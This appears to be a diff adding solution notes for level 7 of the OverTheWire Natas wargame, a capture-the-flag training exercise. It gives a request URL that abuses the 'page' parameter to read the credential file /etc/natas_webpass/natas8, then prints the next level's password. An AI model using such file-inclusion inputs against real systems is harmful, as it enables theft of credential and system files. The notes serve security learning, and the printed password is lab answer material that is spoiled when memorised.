@@ -1,0 +1,8 @@
+Video Solution: https://youtu.be/f3Esi58k66Q
+Task on Overthewire: http://overthewire.org/wargames/natas/
+
+view-source:http://natas7.natas.labs.overthewire.org/
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
